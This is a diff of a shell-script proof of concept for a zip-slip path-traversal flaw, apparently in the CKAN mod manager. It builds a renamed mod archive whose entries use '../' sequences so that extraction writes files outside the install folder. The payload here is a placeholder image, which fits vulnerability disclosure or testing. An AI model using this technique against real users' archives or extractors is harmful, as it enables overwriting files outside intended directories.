@@ -1,9 +1,14 @@
-# Take a working archive such as DogeCoinFlag-1.01.zip
-# Extract it
+# Create folder to work in
+mkdir -p /tmp/PoC/a/b/c/d/DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags/
 
-cd /home/kali/Downloads/CKAN
+# Rename a working archive such as DogeCoinFlag-1.01.zip
+mv DogeCoinFlag-1.01.zip /tmp/PoC/a/b/c/d/DogeCoinFlag-1.01-zip-slip.zip
 
-# Prepare the PoC ZIP file
+# Go to working directory and create the file that will be written outside the directory
+cd /tmp/PoC/a/b/c/d/
+touch /tmp/PoC/a/b/c/d/DogeCoinFlag-1.01/GameData/DogeCoinFlag/dogecoin2.png
+touch /tmp/PoC/a/b/c/dogecoin2.png
+
+# Add a file using relative path
 zip -r  DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags/../dogecoin2.png
-zip -r  DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/META.ckan
-zip -r  DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/README.md
+zip -r  DogeCoinFlag-1.01-zip-slip.zip DogeCoinFlag-1.01/GameData/DogeCoinFlag/Flags/../../../../../dogecoin2.png
